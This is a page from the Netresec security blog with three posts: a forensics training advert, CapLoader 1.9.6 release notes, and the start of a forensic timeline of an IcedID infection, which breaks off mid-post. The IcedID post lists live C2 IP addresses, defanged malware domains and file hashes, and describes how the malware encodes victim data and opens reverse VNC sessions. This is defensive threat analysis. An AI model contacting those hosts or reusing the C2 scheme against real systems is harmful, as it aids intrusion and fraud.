<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en">
  <head>
    <title>NETRESEC Network Security Blog</title>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
    <meta property="og:title" content="NETRESEC Network Security Blog" />
    <meta property="og:site_name" content="Netresec" />
    <meta property="og:type" content="article" />
    <meta http-equiv="Content-Language" content="en" />
    <meta name="msapplication-starturl" content="https://www.netresec.com" />
    <meta name="description" content="Network forensics, packet sniffers and IT security products. Download NetworkMiner and other free software for network security analysis." />
    <meta name="keywords" content="network security,forensics,nfat,packet analyzer,pcap,sniffer,internet security,packet dump,packet sniffer,network analyzer,networkminer,network miner,netminer" />
    <meta property="article:published_time" content="2023-12-11T12:55:00.0000000Z" />
    <link rel="icon" sizes="192x192" href="/favicon-192x192.png" />
    <link rel="icon" sizes="144x144" href="/favicon-144x144.png" />
    <link rel="icon" sizes="96x96" href="/favicon-96x96.png" />
    <link rel="icon" sizes="48x48" href="/favicon-48x48.png" />
    <link rel="icon" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta name="msapplication-TileImage" content="/images/netresec_logo_144x144.png" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="viewport" content="width=620, initial-scale=1" />
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="alternate" type="application/rss+xml" title="NETRESEC Network Security Blog" href="https://www.netresec.com/rss.ashx" />
  </head>
  <body>
    <div class="middle">
      <div id="pageHeader" style="min-height: 144px;">
        <span style="align: right; float: right; vertical-align: top;">Experts in network security monitoring and network forensics</span>
        <a href="https://www.netresec.com/">
          <img src="/images/Netresec_Logo_550x140.png" width="275" height="70" alt="Netresec" style="margin-left: 16px" />
        </a>
        <div class="topNavigation">
          <span>
            <a href="/?page=Home">NETRESEC</a>|</span>
          <span>
            <a href="/?page=Products">Products</a>|</span>
          <span>
            <a href="/?page=Training">Training</a>|</span>
          <span>
            <a href="/?page=Resources">Resources</a>|</span>
          <span>
            <a href="/?page=Blog">Blog</a>|</span>
          <span>
            <a href="/?page=AboutNetresec">About Netresec</a>
          </span>
        </div>
        <span class="path">
          <a href="/">NETRESEC</a>
	  »
	  <a href="&#xA;&#x9;&#x9;      /?page=Blog">Blog</a></span>
      </div>
      <div id="pageBody">
        <div class="mainpane">
          <h3 style="max-width: 400px; float: left; padding: 5px 0px 0px 16px;">NETRESEC Network Security Blog</h3>
          <a href="https://www.netresec.com/rss.ashx" title="Netresec's RSS Feed">
            <img src="/images/rss_icon_64x64.png" alt="rss" style="float: right; margin: 5px 0px 12px 12px; border-style: none;" width="64" height="64" />
          </a>
          <a href="https://news.google.com/publications/CAAqBwgKMIKCogswxYy6Aw" title="Netresec on Google News">
            <img src="/images/Google_News_64x64.png" alt="Google News" style="float: right; margin: 5px 12px 12px 12px; border-style: none;" width="64" height="64" />
          </a>
          <div class="blogPost">
            <article>
              <div class="byline-name" style="float:left;">Erik Hjelmvik</div>
              <div style="float:left;">, </div>
              <div class="dateline" style="float:left;">Monday, 11 December 2023 12:55:00 (UTC/GMT)</div>
              <br />
              <h2>
                <a class="blogPostTitle" href="/?page=Blog&amp;month=2023-12&amp;post=Network-Forensics-Training---Spring-2024">Network Forensics Training - Spring 2024</a>
              </h2>
              <img src="https://www.netresec.com/images/PCAP-in-the-morning_240304_RJ45_242x189.webp" alt="PCAP in the Morning - March 4-7 and 25-28" widht="242" height="189" style="float: right;" />
              <p>
        I will teach two live online network forensics classes in March, one on European morning time, and the other on US morning time. The subject for both classes is network forensics in an incident response context.
      </p>
              <p>
        The training is split into four interactive morning sessions, so that you have the afternoon free to either practice what you learned in class or catch up with your “normal” day job. The number of attendees will be limited in order to provide a good environment for taking questions. A maximum of 15 attendees will be accepted per class. The registration will be closed once we reach this attendee limit.
      </p>
              <ul style="list-style: none; margin-left: 0; padding-left: 1em;">
                <li>
                  <b>🇪🇺 March 4-7, 2024: PCAP in the Morning Europe</b>
                  <br />
          ⏲️ Time: 8:30 AM to 12:30 PM CET<br />
          💸 Price: € 930 EUR per student
        </li>
                <li>
                  <b>🇺🇸 March 25-28, 2023: PCAP in the Morning US</b>
                  <br />
          ⏲️ Time: 9:30 AM to 1:30 PM EDT<br />
          💸 Price: $1,000 USD per student
        </li>
              </ul>
              <p>
        We will be analyzing a unique 30GB PCAP data set captured during June 2020
        on an Internet connected network with multiple clients, an AD server, a web server,
        an android tablet and some embedded devices.
        As you’ve probably guessed, the capture files contain traffic
        from multiple intrusions by various attackers, including APT style attackers and botnet operators.
        The initial attack vectors are using techniques like exploitation of web vulnerabilities,
        spear phishing, a supply chain attack and a man-on-the-side attack!
        In this training you'll get first-hand experience looking at C2 and backdoor protocols, such as Cobalt Strike, TrickBot, njRAT and Meterpreter.
      </p>
              <p>
        See our <a href="https://www.netresec.com/?page=Training">training page</a> for more info about the “PCAP in the Morning” classes.
      </p>
              <p>
        To sign up for a class, simply send an email to sales@netresec.com with the class dates,
        your name and invoice address.
        We will then send you a PayPal payment link that you can use to complete your training registration.
      </p>
              <p>
        Hope to see you there!
      </p>
              <img src="https://www.netresec.com/images/PCAP_T-shirt_200x192.jpg" alt="Erik H" />
              <p>
        Cheers,<br />
        Erik Hjelmvik<br /><i>Creator of NetworkMiner and founder of Netresec</i></p>
              <p class="shadyText">
          Posted by Erik Hjelmvik on Monday, 11 December 2023 12:55:00 (UTC/GMT)</p>
              <p>
          Tags: <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Netresec">Netresec</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=PCAP">PCAP</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Training">Training</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Network Forensics">Network Forensics</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Class">Class</a></span>​
  </p>
            </article>
            <p>
        Share: 
        <a rel="nofollow" title="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-12%26post%3dNetwork-Forensics-Training---Spring-2024"><img src="/images/share/facebook.gif" alt="Facebook" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=Network%20Forensics%20Training%20-%20Spring%202024&amp;url=https%3a%2f%2fnetresec.com%2f%3fb=23C9979&amp;via=netresec"><img src="/images/share/twitter_16.png" alt="Twitter" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to reddit" href="https://www.reddit.com/r/netsec/submit?url=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-12%26post%3dNetwork-Forensics-Training---Spring-2024"><img src="/images/share/reddit.gif" alt="Reddit" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to Hacker News on Y Combinator" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-12%26post%3dNetwork-Forensics-Training---Spring-2024&amp;t=Network%20Forensics%20Training%20-%20Spring%202024"><img src="/images/share/ycombinator_16x16.png" alt="Hacker News" style="vertical-align: top; border-style: none;" width="16" height="16" /></a><span style="float: right;">
          Short URL: 
          <a href="https://netresec.com/?b=23C9979">
            https://netresec.com/?b=23C9979</a></span></p>
          </div>
          <div class="blogPost">
            <article>
              <div class="byline-name" style="float:left;">Erik Hjelmvik</div>
              <div style="float:left;">, </div>
              <div class="dateline" style="float:left;">Wednesday, 15 November 2023 12:08:00 (UTC/GMT)</div>
              <br />
              <h2>
                <a class="blogPostTitle" href="/?page=Blog&amp;month=2023-11&amp;post=CapLoader-1-9-6-Released">CapLoader 1.9.6 Released</a>
              </h2>
              <img src="https://www.netresec.com/images/CL_1-9-6_204x204.png" alt="CapLoader 1.9.6" width="204" height="204" style="float: right;" />
              <p>
                <a href="https://www.netresec.com/?page=CapLoader">CapLoader</a> now detects even more malicious protocols and includes several new features such as JA4 fingerprints, API support for sharing IOCs to ThreatFox and OSINT lookups of malware families on Malpedia. The new CapLoader 1.9.6 release also comes with several improvements of the user interface, for example interactive filtering of flows and services with regular expressions.
      </p>
              <p style="clear: both;">
                <b>Detection of Malware C2 Protocols</b>
              </p>
              <p>
        Malware authors continually keep coming up with new C2 protocols for defenders to detect. Luckily we don’t need to manually create protocol signatures for CapLoader, we only need a few examples of traffic for a protocol to generate a statistical model that CapLoader can use to detect that protocol.
        We call this feature <a href="https://netresec.com/?b=15A1776">Port Independent Protocol Identification</a> (PIPI).
      </p>
              <p>
        We’ve added support for detecting of the following protocols in this new release of CapLoader:
      </p>
              <div style="clear: both; overflow: hidden; margin: 8px; margin-top: 4px; margin-bottom: 4px; padding-bottom: 10px;">
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria">Ave Maria</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://infosec.exchange/@netresec/110383639685887002">BackConnect XOR</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.bandook">Bandook</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.bumblebee">Bumblebee</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.danabot">DanaBot</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.isfb">Gozi ISFB backconnect</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://github.com/skywind3000/kcp">KCP</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat">LimeRAT</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.lobshot">LOBSHOT</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.loda">Loda</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://bazaar.abuse.ch/browse/signature/PovertyStealer/">PovertyStealer</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.risepro">RisePro</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://infosec.exchange/@netresec/111374071337860364">Socks5Systemz backconnect</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm">XWorm</a>
                </div>
                <div style="margin: inherit; float: left;">
                  <a href="https://www.proofpoint.com/us/blog/threat-insight/zenrat-malware-brings-more-chaos-calm">ZenRAT</a>
                </div>
              </div>
              <img src="https://www.netresec.com/images/CapLoader_Services_Malicious-protocols-from-sandboxes_520x669.png" alt="Malicious protocols detected by CapLoader" width="520" height="669" style="clear: both;" />
              <p>
                <i>
          Image: Protocols identified in PCAP files with malware traffic from various sandboxes (<a href="https://any.run/">ANY.RUN</a>, <a href="https://www.hybrid-analysis.com/">Hybrid-Analysis</a>, <a href="https://www.joesandbox.com/#windows">Joe Sandbox</a> and <a href="https://tria.ge/">Triage</a>)
        </i>
              </p>
              <p>
        Our PIPI feature can also detect protocols inside of other protocols, such as
        <a href="https://netresec.com/?b=21536fc">Cobalt Strike</a>,
        <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.dcrat">DCRat</a>,
        <a href="https://netresec.com/?b=225196a">Emotet</a>,
        <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.formbook">Formbook</a>,
        <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.isfb">Gozi ISFB</a>,
        <a href="https://netresec.com/?b=23A4de6">GzipLoader</a> and
        <a href="https://infosec.exchange/@netresec/111364276726538089">Socks5Systemz</a> which all run on top of HTTP.
        It is sometimes even possible to identify malicious protocols that use TLS encryption, such as
        <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.asyncrat">AsyncRAT</a>,
        <a href="https://netresec.com/?b=21536fc">Cobalt Strike</a>,
        <a href="https://netresec.com/?b=225196a">Emotet</a>,
        <a href="https://netresec.com/?b=23A4de6">IcedID</a> or
        <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.remcos">Remcos</a>.
        However, detection of malicious TLS encrypted protocols is a difficult challenge and might be subject to false positives.
      </p>
              <p>
                <b>Sharing IOCs to ThreatFox</b>
              </p>
              <p>
                <a href="https://threatfox.abuse.ch/">ThreatFox</a> is a free online service for sharing indicators of compromise (IOCs) from malware. ThreatFox can be queried for a particular malware family,
        such as <a href="https://threatfox.abuse.ch/browse/malware/win.redline_stealer/">RedLine Stealer</a>, and it’ll return a list of URLs, domain names and IP:port pairs used for C2 communication or payload delivery for that malware. You can also query for a domain or IP address to see if it’s a known C2 address of any malware or botnet.
      </p>
              <p>
        CapLoader has supported OSINT lookup of IP addresses and domains on ThreatFox since the <a href="https://netresec.com/?b=2159bda">release of version 1.9</a>, but with this release we also add the ability to contribute by sharing IOCs with the infosec community. All you need to do is to enter your ThreatFox API-key in CapLoader’s settings, then right-click a flow, service or alert and select “Submit to ThreatFox”.
      </p>
              <img src="https://www.netresec.com/images/CapLoader_submit-to-ThreatFox_366x310.png" alt="Submitting Loda IOC to ThreatFox" width="366" height="310" style="clear: both;" />
              <p>
                <i>Image: Submission of <a href="https://threatfox.abuse.ch/ioc/1202008/">microsoft.net.linkpc[.]net</a> to ThreatFox</i>
              </p>
              <p>
        If the right-clicked item is an alert for a “Malicious protocol” then CapLoader will automatically populate the Mapledia Name field, as shown in the screenshot (win.loda).
      </p>
              <p>
                <b>TLS Client Fingerprinting with JA4</b>
              </p>
              <p>
        John Althouse <a href="https://blog.foxio.io/ja4-network-fingerprinting-9376fe9ca637">announced the new JA4+</a> fingerprint methods a couple of months ago on the FoxIO blog. In short JA4+ is a suite of methods designed to fingerprint implementations of a specific set of protocols, including TLS, HTTP and SSH. As you’ve probably guessed JA4+ is a successor to the JA3 and JA3S hashes that we’ve learned to love (we <a href="https://netresec.com/?b=19B4a1a">added JA3 fingerprinting to NetworkMiner</a> in 2019).
      </p>
              <p>
        Most of the fingerprinting methods in the JA4+ suite are patent pending except for the TLS client fingerprinting method “JA4”, which FoxIO does <a href="https://github.com/FoxIO-LLC/ja4/blob/6d4e5eb5bcf32304dfeae3880828b9f3616b124c/License%20FAQ.md">not have patent claims</a> and is not planning to pursue patent coverage for. We have therefore built a JA4 fingerprinting engine that we’ve included in this CapLoader release. Future releases of NetworkMiner will hopefully also include our JA4 fingerprinting engine.
      </p>
              <img src="https://www.netresec.com/images/CapLoader_Services_Remcos_JA3-JA4_a85be79f7b569f1df5e6087b69deb493_520x482.png" alt="JA3 and JA4 fingerprints of Remcos traffic. a85be79f7b569f1df5e6087b69deb493 t13i010400_0f2cb44170f4_5c4c70b73fa0 t13i010400_0f2cb44170f4_1b583af8cc09" width="520" height="482" style="clear: both;" />
              <p>
                <i>Image: JA3 and JA4 hashes of Remcos C2 traffic</i>
              </p>
              <p>
        JA4 is similar to JA3 in many ways, but one essential difference is that JA4 fingerprints are something of a <a href="https://en.wikipedia.org/wiki/Fuzzy_hashing">fuzzy hash</a> of the client’s handshake rather than a MD5 hash of the raw fingerprint. JA3’s use of MD5 hashing has received criticism, for example in <a href="https://www.utupub.fi/bitstream/handle/10024/170432/On_Usability_of_Hash_Fingerprinting_for_Endpoint_Application_Identification_IEEE_CSR%20(1).pdf">academic literature</a>, partly due to the inability to see if two JA3 hashes have similar TLS handshakes.
      </p>
              <img src="https://www.netresec.com/images/JA4_t13i010400_0f2cb44170f4_5c4c70b73fa0_518x136.webp" alt="JA4 hash explained. Breakdown of Remcos JA4 hash t13i010400_0f2cb44170f4_5c4c70b73fa0" width="518" height="136" style="clear: both;" />
              <p>
        JA4 does use hashes, but instead of just being one big hash it breaks the fingerprint into three separate sections; where the first section is used in its raw (non-hashed) format and the other two sections are hashed separately. Thus, an update of a TLS implementation, which only adds one additional cipher, will increment the cipher counter in the first section of the JA4 fingerprint by one and the ciphers hash (second section) will get a new value. The hash in the last section will remain intact.
      </p>
              <p>
        In the previous CapLoader screenshot with Remcos C2 traffic we see TLS handshakes that have the same JA3 hash (<span style="word-break: break-all;">a85be79f7b569f1df5e6087b69deb493</span>) but the JA4 fingerprints have different values
        (<span style="word-break: break-all;">t13i010400_0f2cb44170f4_5c4c70b73fa0</span> and <span style="word-break: break-all;">t13i010400_0f2cb44170f4_1b583af8cc09</span>).
        The reason why the last JA4 section is different even though the JA3 hash is the same is because some of these TLS handshakes present a different set of signature algorithms, which is a parameter that isn't being used in JA3.
        <!--This is because the last section of the JA4 fingerprint includes signature algorithms, which JA3 doesn't use.--></p>
              <p>
                <b>Alerts Tab</b>
              </p>
              <p>
        CapLoader’s Alerts tab now includes more alert types than before and each alert has a severity rating graded as follows:
      </p>
              <ul>
                <li>High = 4</li>
                <li>Medium = 3</li>
                <li>Low = 2</li>
                <li>Info = 1</li>
              </ul>
              <p>
        A typical high-severity alert is when a known malicious protocol is detected, while an “Info” type alert can provide a heads up about traffic from things like coin mining or legitimate remote admin tools. As you can see in the screenshot below the alerts are sorted based on severity to make it easier to prioritize them.
      </p>
              <img src="https://www.netresec.com/images/CapLoader_Alerts_IcedID_2023-10-16_520x510.png" alt="Alerts in CapLoader for 2023-10-16-IcedID-infection.pcap" width="520" height="510" style="clear: both;" />
              <p>
                <i>Image: CapLoader alerts for <a href="https://malware-traffic-analysis.net/2023/10/16/index.html">2023-10-16-IcedID-infection.pcap</a></i>
              </p>
              <p>
        Here’s a breakdown of the alerts shown in the CapLoader screenshot above:
      </p>
              <ul>
                <li>GzipLoader traffic to 104.21.7.13:80 / <a href="https://threatfox.abuse.ch/ioc/1189720/">aptekoagraliy[.]com</a></li>
                <li>BackConnect XOR traffic to <a href="https://threatfox.abuse.ch/ioc/1138370/">159.89.124.188:443</a></li>
                <li>IcedID over TLS traffic to <a href="https://threatfox.abuse.ch/ioc/1202383/">104.223.118.109:443</a> / <a href="https://threatfox.abuse.ch/ioc/1189715/">seedkraproboy[.]com</a></li>
                <li>Port-protocol mismatch (non-TLS traffic to port 443) for <a href="https://threatfox.abuse.ch/ioc/1138370/">159.89.124.188:443</a></li>
                <li>Periodic connections every 5 minutes to <a href="https://threatfox.abuse.ch/ioc/1126225/">151.236.9.107:443</a> / <a href="https://threatfox.abuse.ch/ioc/1191003/">lazirusairnaf[.]com</a></li>
                <li>Periodic connections every 5 minutes to <a href="https://threatfox.abuse.ch/ioc/1202383/">104.223.118.109:443</a> / <a href="https://threatfox.abuse.ch/ioc/1189715/">seedkraproboy[.]com</a></li>
                <li>Long running TCP session to <a href="https://threatfox.abuse.ch/ioc/1138370/">159.89.124.188:443</a></li>
                <li>Long running TCP session to <a href="https://threatfox.abuse.ch/ioc/1202384/">104.248.81.48:443</a> / <a href="https://threatfox.abuse.ch/ioc/1182862/">joekairbos[.]com</a></li>
              </ul>
              <p>
        All these alerts are indicators of an IcedID infection, including the 5 minute C2 connection interval which I have
        <a href="https://netresec.com/?b=23242ad">mentioned before</a>.
      </p>
              <p>
                <b>Other User Interface Improvements</b>
              </p>
              <p>
        CapLoader’s “Column Criteria” row filter could previously only be used to filter on columns with a specific value, such as “Protocol = TLS”. This new release of CapLoader additionally allows users to do substring matching with the “contains” keyword and regular expression (regex) matching with the “matching” keyword. In the screenshot below the Column Criteria <span style="word-break: break-all;">“Hostname matches \.local$”</span> is used to only show hosts that have a hostname ending with “.local”.
      </p>
              <img src="https://www.netresec.com/images/CapLoader_Hosts_Hostname-matches-local_520x472.png" alt="RegEx matching of .local hostnames" width="520" height="472" style="clear: both;" />
              <p>
        We’ve also added an often asked for feature to CapLoader, namely the ability to switch between different flows in the Transcript window.
      </p>
              <img src="https://www.netresec.com/images/CapLoader_Transcript_Change-this-number-to-show-next-flow_520x285.png" alt="CapLoader Transcript. Change this number to show next flow" width="520" height="285" style="clear: both;" />
              <p>
        The flows you can switch between depends on how the transcript window was opened. A flow transcript opened from the Flows tab will allow switching between the flows that were visible in the list from where the transcript was opened. A transcript opened from any of the other tabs (Services, Hosts or Alerts), on the other hand, allows switching between the different flows for the particular service, host or alert that was opened.
      </p>
              <p>
                <b>Credits</b>
              </p>
              <p>
        I would like to thank <a href="https://twitter.com/NickCerny">Nic Cerny</a>, Trent Healy and Fredrik Ginsberg for their input on various improvements that have been implemented in CapLoader 1.9.6.
      </p>
              <p>
                <b>Updating to the Latest Release</b>
              </p>
              <p>
        ﻿Users who have already purchased a license for CapLoader can download a free update to version 1.9.6 from our <a href="https://www.netresec.com/portal/">customer portal</a> or by clicking “Check for Updates” in CapLoader’s Help menu.
      </p>
              <p class="shadyText">
          Posted by Erik Hjelmvik on Wednesday, 15 November 2023 12:08:00 (UTC/GMT)</p>
              <p>
          Tags: <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=CapLoader">CapLoader</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=ThreatFox">ThreatFox</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=JA3">JA3</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=IcedID">IcedID</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=GzipLoader">GzipLoader</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=regex">regex</a></span>​
  </p>
            </article>
            <p>
        Share: 
        <a rel="nofollow" title="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-11%26post%3dCapLoader-1-9-6-Released"><img src="/images/share/facebook.gif" alt="Facebook" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=CapLoader%201.9.6%20Released&amp;url=https%3a%2f%2fnetresec.com%2f%3fb=23B6bcd&amp;via=netresec"><img src="/images/share/twitter_16.png" alt="Twitter" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to reddit" href="https://www.reddit.com/r/netsec/submit?url=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-11%26post%3dCapLoader-1-9-6-Released"><img src="/images/share/reddit.gif" alt="Reddit" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to Hacker News on Y Combinator" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-11%26post%3dCapLoader-1-9-6-Released&amp;t=CapLoader%201.9.6%20Released"><img src="/images/share/ycombinator_16x16.png" alt="Hacker News" style="vertical-align: top; border-style: none;" width="16" height="16" /></a><span style="float: right;">
          Short URL: 
          <a href="https://netresec.com/?b=23B6bcd">
            https://netresec.com/?b=23B6bcd</a></span></p>
          </div>
          <div class="blogPost">
            <article>
              <div class="byline-name" style="float:left;">Erik Hjelmvik</div>
              <div style="float:left;">, </div>
              <div class="dateline" style="float:left;">Thursday, 12 October 2023 13:23:00 (UTC/GMT)</div>
              <br />
              <h2>
                <a class="blogPostTitle" href="/?page=Blog&amp;month=2023-10&amp;post=Forensic-Timeline-of-an-IcedID-Infection">Forensic Timeline of an IcedID Infection</a>
              </h2>
              <p>
        The BackConnect and VNC parsers that were added to <a href="https://netresec.com/?b=23A41e6">NetworkMiner 2.8.1</a> provide a unique possibility to trace the steps of an attacker with help of captured network traffic from a hacked computer.
      </p>
              <p>
        In this blog post I use the free and open source version of <a href="https://www.netresec.com/?page=NetworkMiner">NetworkMiner</a> to see how GzipLoader downloads IcedID, after which the attacker deploys BackConnect VNC to purchase an iPhone 14 with a stolen credit card and then drops Cobalt Strike on the victim PC.
      </p>
              <p>
        The analyzed pcap is <span style="word-break: break-all">2022-10-31-IcedID-with-DarkVNC-and-Cobalt-Strike-full-pcap-raw.pcap</span> from <a href="https://infosec.exchange/@malware_traffic">Brad Duncan</a>'s <a href="https://malware-traffic-analysis.net/2022/10/31/index.html">malware-traffic-analysis.net</a> blog.
      </p>
              <p>
                <b>Safety First</b>
              </p>
              <p>
        I ran NetworkMiner in a <a href="https://netresec.com/?b=215d5b5">Windows Sandbox</a> when analyzing this PCAP file to avoid accidentally infecting my computer with any of the malicious artifacts that NetworkMiner extracts from the network traffic.
      </p>
              <p>
        Another safe way to analyze Windows malware is to <a href="https://netresec.com/?b=142AA47">run NetworkMiner in Linux</a> or <a href="https://netresec.com/?b=146F525">macOS</a>.
      </p>
              <p>
                <b>14:47 GzipLoader</b>
              </p>
              <p>
        This infection starts with GzipLoader (aka “IcedID Downloader”) reaching out to its C2 server on vgiragdoffy[.]com (<a href="https://threatfox.abuse.ch/browse.php?search=ioc%3A67.205.184.237%3A80">67.205.184.237:80</a>) to download IcedID.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Parameters_GzipLoader__gads_509x389.png" alt="Cookie parameters from GzipLoader request in NetworkMiner 2.8.1" width="509" height="389" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Cookie parameters from GzipLoader request</i>
              <p>
        The “_gat” cookie value in frame number 6 tells us that the victim machine is running a Windows 10 build 19045 (aka 22H2). The long “_u” value contains the victim’s username and hostname in hexadecimal representation and the “__io” value is the logged in user’s <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">SID</a>.
        NetworkMiner decodes these values from the GzipLoader request and displays them in the Hosts tab.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Hosts_GzipLoader_extraction_520x608.png" alt="Hostname, SID, username and Windows version extracted from GzipLoader cookie by NetworkMiner 2.8.1" width="520" height="608" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Hostname, SID, username and Windows version extracted from GzipLoader cookie</i>
              <p>
        For more info about the GzipLoader cookie, see
        <a href="https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html">IcedID PhotoLoader evolution</a> by <a href="https://infosec.exchange/@sysopfb">Jason Reaves</a> and the
        <a href="https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-gootloader-and-icedid">eSentire blog post on Gootloader and IcedID</a>.
      </p>
              <p>
        The response for this GzipLoader request is a 550 kB file (MD5 <span style="word-break: break-all">700c602086590b05dde8df57933c7e68</span>) with a fake gzip header. This file actually contains the IcedID DLL (<a href="https://www.virustotal.com/gui/file/ff3be9c287431fec953681fd50c96632cefaa164a00ab84dcecd1a817537777e/details">Odwikp.dll</a>) and <a href="https://www.virustotal.com/gui/file/a0f5450deb333336e9d157e94647381036e7a9107ec842b24a9624d59cbfd59a/details">license.dat</a> files.
      </p>
              <img src="https://www.netresec.com/images/FileDetails_GzipLoader_700c602086590b05dde8df57933c7e68_506x322.png" alt="Fake gzip file containing IcedID" width="506" height="322" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Fake gzip file containing IcedID</i>
              <p>
                <b>14:47 IcedID</b>
              </p>
              <p>
        The banking trojan IcedID (aka BokBot) gets launched at 14:47:29 UTC (frame 641) after which it connects to these four IcedID servers used for payload delivery and C2:
        <ul><li>ringashopsu[.]com = 137.184.208.116</li><li>sainforgromset[.]com = 138.68.255.102</li><li>yeloypod[.]hair = 94.140.114.103</li><li>airsaintol[.]beauty = 66.63.168.75</li></ul></p>
              <img src="https://www.netresec.com/images/NetworkMiner_Hosts_IcedID_ec74a5c51106f0419184d0dd08fb05bc_519x546.png" alt="NetworkMiner hosts details for IcedID C2 server showing JA3S hash ec74a5c51106f0419184d0dd08fb05bc" width="519" height="546" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: JA3S hash of C2 server<!-- to which IcedID bot connects every 5 minutes--></i>
              <p>
        These four IcedID servers all run TLS servers with self signed certificates issued for "localhost" and doing TLS handshakes with JA3S hash <span style="word-break: break-all">ec74a5c51106f0419184d0dd08fb05bc</span>. Both these properties can be used as filters in NetworkMiner's Hosts tab to only display the IcedID C2 servers.
      </p>
              <img src="https://www.netresec.com/images/X-509_certificate_d14983ecbe0f97023721d0960f5dc98388809cc9_ringashopsu-com_405x515.png" alt="Self-signed X.509 certificate issued to localhost from ringashopsu[.]com with thumbprint d14983ecbe0f97023721d0960f5dc98388809cc9" width="405" height="515" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Self-signed certificate from ringashopsu[.]com</i>
              <p>
                <b>14:59 BackConnect and Keyhole VNC</b>
              </p>
              <p>
        Shortly after the IcedID C2 traffic has been started the IcedID bot also initiates <a href="https://netresec.com/?b=22A38f9">BackConnect</a> C2 connections to 137.74.104.108 on TCP port 8080 (frame 4505 at 14:59:14 UTC).
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Parameters_IcedID-BackConnect_519x555.png" alt="IcedID BackConnect communication in NetworkMiner 2.8.1" width="519" height="555" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: IcedID BackConnect communication</i>
              <p>
        The BackConnect C2 server tells the bot to sleep for 60 seconds two times before launching a reverse VNC session with command 0x11 (frame 4530 at 15:01.09 UTC).
      </p>
